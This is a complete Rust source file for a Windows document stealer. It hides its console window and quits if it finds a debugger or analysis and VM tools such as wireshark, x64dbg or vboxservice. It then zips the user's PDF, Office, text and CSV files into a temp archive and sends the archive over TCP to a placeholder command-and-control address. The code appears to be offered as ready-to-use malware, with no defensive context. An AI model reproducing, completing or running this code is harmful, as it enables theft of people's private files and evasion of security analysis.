use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpStream;

use winapi::um::{
    debugapi::CheckRemoteDebuggerPresent,
    processthreadsapi::GetCurrentProcess,
    tlhelp32::{CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
};

use zip::{write::FileOptions, ZipWriter};

fn send_data(path: &std::path::Path) -> std::io::Result<usize> {
    let mut file = File::open(path)?;
    let mut buffer: Vec<u8> = match &file.metadata() {
        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
        Err(_) => Vec::new(),
    };
    let _ = file.read_to_end(&mut buffer)?;
    let mut stream = TcpStream::connect("C2IP:C2PORT")?;
    stream.write(&buffer)
}

fn grab_data() -> std::io::Result<()> {
    let user = whoami::realname();

    let filename = format!("C:/Users/{}/AppData/Local/Temp/sensfiles.zip", &user);
    let path = std::path::Path::new(&filename);

    if let Ok(file) = std::fs::File::create(&path) {
        let mut zip_writer = ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

        let glob_string = format!(
            "C:/Users/{}/*.{{pdf,xls,txt,doc,docx,ppt,pptx,odt,xlsx,xlsm,xls,csv}}",
            &user
        );

        globwalk::glob(&glob_string)?
            .filter_map(|dent| dent.ok())
            .enumerate()
            .for_each(|(_idx, dent)| {
                let path = dent.path();
                if path.is_file() {
                    if let Ok(f) = &mut File::open(path) {
                        let mut buffer: Vec<u8> = match &f.metadata() {
                            Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                            Err(_) => Vec::new(),
                        };
                        if f.read_to_end(&mut buffer).is_ok()
                            && zip_writer.start_file_from_path(path, options).is_ok()
                        {
                            let _ = zip_writer.write_all(&buffer);
                        }
                    }
                }
            });
    }
    send_data(&path)?;
    Ok(())
}

unsafe fn anti_debug() {
    let mut dbgtst: i32 = 1;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut dbgtst);

    if dbgtst == 1 {
        std::process::exit(0x0100);
    }
}

unsafe fn anti_vm() {
    let mut pe32: PROCESSENTRY32 = std::mem::zeroed();
    pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    while Process32Next(handle, &mut pe32) != 0 {
        // let  procid = pe32.th32ProcessID;
        let procname: String = pe32.szExeFile.iter().map(|c| *c as u8 as char).collect();
        if procname.contains("vmtools")
            || procname.contains("vm3dservice")
            || procname.contains("vboxservice")
            || procname.contains("vboxtray")
            || procname.contains("wireshark")
            || procname.contains("processhacker")
            || procname.contains("ida64")
            || procname.contains("ida.exe")
            || procname.contains("x64dbg")
        {
            std::process::exit(0x0100);
        }
    }
}

fn stealth() {
    unsafe {
        winapi::um::wincon::FreeConsole();
        anti_vm();
        anti_debug();
    }
}
fn main() {
    stealth();
    if let Err(err) = grab_data() {
        println!("{:?}", &err);
    };
}
